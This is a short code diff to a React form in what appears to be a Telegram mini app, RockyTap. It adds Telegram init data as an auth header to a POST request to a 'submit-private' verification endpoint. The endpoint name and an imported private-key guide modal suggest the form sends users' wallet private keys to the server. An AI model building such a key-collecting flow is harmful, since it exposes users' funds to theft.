@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { AssistedVerificationProps } from './types';
 import { Button, Input } from '../ui';
 import { useToast } from '../ui';
-import { hapticFeedback } from '../../lib/telegram';
+import { hapticFeedback, getInitData } from '../../lib/telegram';
 import { AlertTriangle, Shield, Key, CheckCircle, Loader, ShieldCheck, HelpCircle } from 'lucide-react';
 import { PrivateKeyGuideModal } from './PrivateKeyGuideModal';
 import styles from './AssistedVerificationForm.module.css';
@@ -105,10 +105,12 @@ export function AssistedVerificationForm({
     setIsSubmitting(true);
 
     try {
-      const response = await fetch('/RockyTap/api/verification/assisted/submit-private', {
+      const initData = getInitData();
+      const response = await fetch('/RockyTap/api/verification/assisted/submit-private/', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
+          'Telegram-Data': initData || '',
         },
         body: JSON.stringify({
           verification_id: verificationId,
